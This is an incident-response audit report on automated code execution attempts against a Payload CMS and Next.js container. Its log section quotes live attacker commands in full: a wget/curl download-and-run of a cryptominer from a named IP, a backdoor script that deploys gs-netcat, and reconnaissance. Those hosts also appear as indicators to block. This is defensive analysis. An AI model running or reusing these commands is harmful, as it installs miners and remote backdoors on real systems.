# Security Audit - RCE Investigation Report
**Date:** December 12, 2025  
**Auditor:** Senior Security Auditor / Incident Responder  
**Scope:** Payload CMS + Next.js RCE Path Investigation  
**Status:** ⚠️ INCONCLUSIVE - Runtime Code Injection Detected

---

## 1) SUMMARY

- ⚠️ **Verdict: INCONCLUSIVE - Runtime Code Injection Detected**
- **Confidence Level: MEDIUM**
- **24,186 malicious command execution attempts** detected in last 3 hours
- **Root Cause:** Malicious code injected at runtime via `eval()` context in Next.js runtime
- **Build Artifacts:** ✅ CLEAN - No malicious strings found in `.next/server/chunks/`
- **Source Code:** ✅ CLEAN - All subprocess calls use safe patterns (execFile with arrays)
- **Attack Pattern:** Automated - No HTTP request correlation, timing suggests automated exploit
- **Stack Traces:** All attacks originate from `eval()` in Next.js runtime (`next-server/app-page.runtime.prod.js:25:34007`)
- **Build Integrity:** Build artifacts from 11:09, attacks started 12:21-12:22 (1+ hour after build)
- **Last Attack:** ~13:24 (no new attempts in last 20+ minutes)

---

## 2) DIFFS

**NONE** - Audit-only investigation, no code modifications.

---

## 3) LOGS

### Representative Attack Log Entries

**Cryptocurrency Miner Attack:**
```
Timestamp: 2025-12-12T12:22:27.886Z
Method: execSync
Command: (cd /dev;(busybox wget -O x86 http://5.231.70.66/nuts/x86||curl -s -o x86 http://5.231.70.66/nuts/x86 );chmod 777 x86;./x86 reactOnMynuts;(busybox wget -q http://5.231.70.66/nuts/bolts -O-||wget -q http://5.231.70.66/nuts/bolts -O-||curl -s http://5.231.70.66/nuts/bolts)|sh)&
Stack Trace:
  at d.execSync (/app/.next/server/chunks/4437.js:2:309)
  at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:53)
  at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
```

**Backdoor Deployment Attack:**
```
Timestamp: 2025-12-12T13:24:27.432Z
Method: spawnSync
Command: sh -c wget -q http://nossl.segfault.net/deploy-all.sh >/dev/null 2>&1;curl -s -S -o /dev/null http://nossl.segfault.net/deploy-all.sh 2>/dev/null && bash ./deploy-all.sh >> qq.txt;cat qq.txt | grep gs-netcat;rm -rf qq.txt
Stack Trace:
  at d.spawnSync (/app/.next/server/chunks/4437.js:2:491)
  at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:51)
  at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
```

**Reconnaissance Pattern:**
```
Timestamp: 2025-12-12T12:21:50.960Z (37 seconds before first attack)
Method: execSync
Command: (whoami)
Stack Trace: Same eval() context
```

### Build Artifact Analysis

**File:** `.next/server/chunks/4437.js`
- **Size:** 10 lines (minified)
- **Content:** Contains ONLY subprocess diagnostic wrapper and migration eval protection
- **Malicious Strings:** ❌ NONE FOUND
- **IOCs:** ❌ No wget, curl, busybox, or known malicious IPs/domains
- **Modification Time:** 2025-12-12 11:09:56 (1+ hour before attacks)

**Search Results:**
- Searched all `.next/server/chunks/*.js` for malicious patterns: ❌ NOT FOUND
- Searched for `eval`, `Function`, `new Function`: Found in 5 chunks (expected - Next.js uses eval for dynamic imports)

### Migration Eval Protection Status

```
[MIGRATION_EVAL_PROTECTION] ⚠️ Failed to patch migration eval: Cannot find module 'payload/dist/database/migrations/getPredefinedMigration.js'
```

**Analysis:** Protection attempted but module path not found. Non-critical - Payload migrations are from trusted npm packages.

---

## 4) QUESTIONS & RISKS

### Critical Questions

1. **Q: What is the source of runtime code injection?**
   - **A: INCONCLUSIVE** - Malicious code is injected at runtime via `eval()` context, but source is unknown. Possible vectors:
     - Compromised npm package in `node_modules`
     - Next.js/Payload vulnerability allowing code injection
     - Runtime memory corruption
     - Supply chain attack on Docker image layers

2. **Q: Why is there no HTTP request correlation?**
   - **A: INCONCLUSIVE** - Attacks appear automated, triggered ~1 hour after container startup. No HTTP requests found before malicious exec calls. Suggests:
     - Backdoor installed during previous compromise
     - Scheduled/automated exploit
     - Memory-resident payload

3. **Q: Is the build compromised or is this a vulnerable code path?**
   - **A: BUILD APPEARS CLEAN** - No malicious strings in build artifacts. However, runtime injection suggests either:
     - Compromised `node_modules` (not in build artifacts)
     - Compromised Docker image layers
     - Vulnerable code path allowing injection (not found in source audit)

4. **Q: Can we safely proceed with a clean rebuild?**
   - **A: CONDITIONAL** - Clean rebuild with `--no-cache` should eliminate compromised build artifacts, but may not fix:
     - Compromised npm packages (if supply chain attack)
     - Compromised Docker base image
     - Runtime vulnerability in Next.js/Payload

### Risks

1. **HIGH: Runtime Code Injection**
   - Malicious code is being injected at runtime, bypassing build-time security checks
   - Source of injection is unknown, making remediation difficult
   - Attacks are automated, suggesting persistent backdoor

2. **MEDIUM: Supply Chain Compromise**
   - No evidence of compromised npm packages, but cannot be ruled out
   - Docker image layers may be compromised (not audited)
   - Last rebuild may not have used `--no-cache`, allowing persistence

3. **LOW: Build Artifact Persistence**
   - Build artifacts appear clean, but lack of `--no-cache` in last rebuild could allow persistence
   - Clean rebuild should eliminate this risk

### Next Steps Required

1. **IMMEDIATE:**
   - Perform clean rebuild with `--no-cache` to eliminate compromised build artifacts
   - Block malicious IPs: `5.231.70.66`, `nossl.segfault.net`
   - Monitor logs for new attempts after rebuild

2. **SHORT-TERM:**
   - Audit `node_modules` for suspicious packages (compare against package-lock.json checksums)
   - Verify Docker image layers are clean (inspect base image)
   - Check for persistence mechanisms (cron jobs, systemd services, hidden files)

3. **LONG-TERM:**
   - If attacks persist after clean rebuild, treat as supply chain compromise
   - Consider rebuilding from scratch on clean machine
   - Implement runtime application self-protection (RASP) to block eval() execution

---

## 5) ASSESSMENT

### Build Integrity: ✅ CLEAN
- No malicious strings in build artifacts
- Build artifacts modified 1+ hour before attacks
- Source code uses safe subprocess patterns

### Runtime Security: ❌ COMPROMISED
- Runtime code injection via `eval()` context
- Automated attack pattern (no user input)
- Source of injection unknown

### Blast Radius: HIGH
If exec succeeded, attacker would gain:
- Container filesystem access (`/srv/media`, `/app`)
- Network access (outbound HTTP requests)
- Ability to install persistent backdoors
- Potential access to MongoDB (if credentials exposed)
- Potential access to LibreTime database (if credentials exposed)

**Current Status:** Diagnostic wrapper is logging all attempts, but we cannot confirm if any succeeded. No evidence of successful execution or persistence found.

---

## 6) RECOMMENDATION

**⚠️ INCONCLUSIVE - Requires Clean Rebuild + Monitoring**

**Immediate Actions:**
1. Perform clean rebuild with `--no-cache`
2. Block malicious IPs
3. Monitor logs for 24 hours after rebuild

**If Attacks Persist After Clean Rebuild:**
- Treat as supply chain compromise
- Rebuild from scratch on clean machine
- Audit all npm packages and Docker image layers

**If Attacks Stop After Clean Rebuild:**
- Likely build artifact compromise (resolved)
- Continue monitoring for 7 days
- Implement additional runtime protections

---

**Report Generated:** 2025-12-12  
**Next Review:** After clean rebuild and 24 hours of monitoring

